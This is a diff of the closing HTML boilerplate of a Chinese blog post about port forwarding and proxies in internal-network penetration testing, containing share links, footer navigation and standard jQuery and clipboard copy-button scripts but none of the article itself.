+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/&title=内网渗透中端口转发和代理总结"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/&title=内网渗透中端口转发和代理总结"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/&title=内网渗透中端口转发和代理总结"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/&title=内网渗透中端口转发和代理总结"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/&name=内网渗透中端口转发和代理总结&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/&t=内网渗透中端口转发和代理总结"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    yu1e
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
